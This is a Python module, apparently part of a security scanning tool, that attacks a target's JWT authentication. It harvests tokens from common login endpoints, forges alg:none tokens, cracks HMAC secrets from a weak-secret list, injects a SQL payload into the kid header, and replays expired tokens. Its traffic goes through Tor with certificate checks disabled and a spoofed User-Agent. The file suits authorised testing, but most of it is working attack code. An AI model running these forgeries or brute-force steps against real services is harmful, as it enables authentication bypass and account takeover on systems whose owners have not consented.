"""
JWT Security Scanner
Tests: alg:none, weak secret brute-force, RS256->HS256 confusion,
kid injection, expired token acceptance, sensitive data in payload
"""

import base64
import json
import logging
import re
import hmac
import hashlib
import struct
import time

from modules.utils import rate_limited_get, tor_session

logger = logging.getLogger(__name__)

WEAK_SECRETS = [
    'secret', 'password', '123456', 'qwerty', 'admin', 'test',
    'jwt_secret', 'your-256-bit-secret', 'supersecret', 'changeme',
    'sentinel', 'key', 'private', 'token', 'auth', 'jwt',
]

JWT_ENDPOINTS = [
    '/api/login', '/api/auth', '/auth/login', '/login',
    '/api/token', '/token', '/api/v1/login', '/api/v2/login',
    '/user/login', '/account/login', '/signin',
]


class JWTScanner:

    def run(self, target: str) -> dict:
        result = {
            'target':          target,
            'tokens_found':    [],
            'findings':        [],
            'total':           0,
            'risk_level':      'LOW',
            'error':           None,
        }
        try:
            session = tor_session()
            base = f"https://{target}"
            tokens = self._harvest_tokens(session, base, result)
            for token in tokens:
                self._test_alg_none(session, base, token, result)
                self._test_weak_secret(token, result)
                self._test_alg_confusion(token, result)
                self._test_kid_injection(session, base, token, result)
                self._test_expired_acceptance(session, base, token, result)
                self._check_sensitive_payload(token, result)
            self._check_jwt_in_url(session, base, result)
        except Exception as e:
            logger.error(f"JWTScanner error for {target}: {e}")
            result['error'] = str(e)

        result['total'] = len(result['findings'])
        result['risk_level'] = self._calc_risk(result['findings'])
        return result

    # ── Token Harvesting ──────────────────────────────────────────────────────

    def _harvest_tokens(self, session, base: str, result: dict) -> list:
        tokens = []
        for path in JWT_ENDPOINTS:
            resp = self._post(session, base + path, json={
                'username': 'test', 'password': 'test',
                'email': 'test@test.com'
            })
            if not resp:
                continue
            # Check response body for JWT
            found = self._extract_jwts(resp.text)
            # Check headers
            auth = resp.headers.get('Authorization', '')
            set_cookie = resp.headers.get('Set-Cookie', '')
            found += self._extract_jwts(auth + ' ' + set_cookie)
            for t in found:
                if t not in tokens:
                    tokens.append(t)
                    result['tokens_found'].append(path)
        return tokens

    def _extract_jwts(self, text: str) -> list:
        pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
        return re.findall(pattern, text)

    # ── Tests ─────────────────────────────────────────────────────────────────

    def _test_alg_none(self, session, base: str, token: str, result: dict):
        """Forge token with alg:none — no signature required."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            header = json.loads(self._b64decode(parts[0]))
            payload = self._b64decode(parts[1])

            # Craft alg:none token
            for alg_val in ('none', 'None', 'NONE', 'nOnE'):
                header['alg'] = alg_val
                new_header = self._b64encode(json.dumps(header, separators=(',', ':')))
                forged = f"{new_header}.{parts[1]}."

                # Try to use forged token on common endpoints
                for ep in ['/api/me', '/api/user', '/api/profile', '/me', '/user']:
                    resp = self._get_auth(session, base + ep, forged)
                    if resp and resp.status_code == 200:
                        result['findings'].append({
                            'severity': 'CRITICAL',
                            'type':     'JWT Algorithm None Accepted',
                            'url':      base + ep,
                            'evidence': f'alg:{alg_val} token accepted — HTTP 200',
                            'detail':   'Server accepts unsigned JWT tokens — complete auth bypass',
                        })
                        return
        except Exception:
            pass

    def _test_weak_secret(self, token: str, result: dict):
        """Brute-force HMAC secret with common weak secrets."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            header = json.loads(self._b64decode(parts[0]))
            alg = header.get('alg', '').upper()
            if alg not in ('HS256', 'HS384', 'HS512'):
                return

            hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
            hash_fn = hash_map.get(alg, hashlib.sha256)

            signing_input = f"{parts[0]}.{parts[1]}".encode()
            sig = self._b64decode_bytes(parts[2])

            for secret in WEAK_SECRETS:
                expected = hmac.new(secret.encode(), signing_input, hash_fn).digest()
                if hmac.compare_digest(expected, sig):
                    result['findings'].append({
                        'severity': 'CRITICAL',
                        'type':     'JWT Weak Secret',
                        'url':      'N/A',
                        'evidence': f'Secret cracked: "{secret}" (alg: {alg})',
                        'detail':   'JWT signed with weak secret — attacker can forge arbitrary tokens',
                    })
                    return
        except Exception:
            pass

    def _test_alg_confusion(self, token: str, result: dict):
        """RS256 -> HS256 algorithm confusion attack."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            header = json.loads(self._b64decode(parts[0]))
            if header.get('alg', '').upper() != 'RS256':
                return
            result['findings'].append({
                'severity': 'HIGH',
                'type':     'JWT RS256 Algorithm — Confusion Risk',
                'url':      'N/A',
                'evidence': f'Token uses RS256 — test HS256 confusion manually',
                'detail':   'If server accepts HS256 with public key as secret, full auth bypass possible (CVE-2015-9235)',
            })
        except Exception:
            pass

    def _test_kid_injection(self, session, base: str, token: str, result: dict):
        """kid header SQL/path injection."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            header = json.loads(self._b64decode(parts[0]))
            if 'kid' not in header:
                return

            # SQL injection in kid
            header['kid'] = "' OR '1'='1"
            new_header = self._b64encode(json.dumps(header, separators=(',', ':')))
            forged = f"{new_header}.{parts[1]}.{parts[2]}"

            for ep in ['/api/me', '/api/user', '/me']:
                resp = self._get_auth(session, base + ep, forged)
                if resp and resp.status_code == 200:
                    result['findings'].append({
                        'severity': 'CRITICAL',
                        'type':     'JWT kid SQL Injection',
                        'url':      base + ep,
                        'evidence': "kid=' OR '1'='1 accepted",
                        'detail':   'JWT kid header vulnerable to SQL injection — key confusion possible',
                    })
                    return
        except Exception:
            pass

    def _test_expired_acceptance(self, session, base: str, token: str, result: dict):
        """Check if expired tokens are still accepted."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            payload = json.loads(self._b64decode(parts[1]))
            exp = payload.get('exp', 0)
            if exp == 0 or exp > time.time():
                return
            # Token is already expired — try using it
            for ep in ['/api/me', '/api/user', '/me']:
                resp = self._get_auth(session, base + ep, token)
                if resp and resp.status_code == 200:
                    result['findings'].append({
                        'severity': 'HIGH',
                        'type':     'Expired JWT Accepted',
                        'url':      base + ep,
                        'evidence': f'Token expired at {exp} still returns HTTP 200',
                        'detail':   'Server does not validate JWT expiration — stolen tokens remain valid forever',
                    })
                    return
        except Exception:
            pass

    def _check_sensitive_payload(self, token: str, result: dict):
        """Check for sensitive data in JWT payload."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return
            payload_str = self._b64decode(parts[1])
            payload = json.loads(payload_str)

            sensitive_keys = ['password', 'passwd', 'secret', 'credit_card',
                               'ssn', 'cvv', 'pin', 'private_key']
            for key in sensitive_keys:
                if key in str(payload).lower():
                    result['findings'].append({
                        'severity': 'HIGH',
                        'type':     'Sensitive Data in JWT Payload',
                        'url':      'N/A',
                        'evidence': f'Key "{key}" found in JWT payload',
                        'detail':   'JWT payload is base64 encoded, not encrypted — sensitive data exposed',
                    })
                    return
        except Exception:
            pass

    def _check_jwt_in_url(self, session, base: str, result: dict):
        """Check if JWT tokens appear in URL parameters."""
        resp = self._get(session, base)
        if not resp:
            return
        if re.search(r'[?&]token=eyJ', resp.url):
            result['findings'].append({
                'severity': 'MEDIUM',
                'type':     'JWT in URL Parameter',
                'url':      resp.url,
                'evidence': 'JWT token found in URL query parameter',
                'detail':   'Tokens in URLs are logged in server logs, browser history, and Referer headers',
            })

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _b64decode(self, s: str) -> str:
        s += '=' * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s).decode('utf-8', errors='replace')

    def _b64decode_bytes(self, s: str) -> bytes:
        s += '=' * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    def _b64encode(self, s: str) -> str:
        return base64.urlsafe_b64encode(s.encode()).rstrip(b'=').decode()

    def _get(self, session, url: str):
        try:
            return session.get(url, timeout=10, verify=False,
                               headers={'User-Agent': 'Mozilla/5.0'},
                               allow_redirects=True)
        except Exception:
            return None

    def _get_auth(self, session, url: str, token: str):
        try:
            return session.get(url, timeout=10, verify=False,
                               headers={'Authorization': f'Bearer {token}',
                                        'User-Agent': 'Mozilla/5.0'})
        except Exception:
            return None

    def _post(self, session, url: str, json: dict):
        try:
            return session.post(url, json=json, timeout=10, verify=False,
                                headers={'User-Agent': 'Mozilla/5.0',
                                         'Content-Type': 'application/json'})
        except Exception:
            return None

    def _calc_risk(self, findings: list) -> str:
        if not findings:
            return 'LOW'
        sevs = [f['severity'] for f in findings]
        if 'CRITICAL' in sevs:
            return 'CRITICAL'
        if 'HIGH' in sevs:
            return 'HIGH'
        if 'MEDIUM' in sevs:
            return 'MEDIUM'
        return 'LOW'
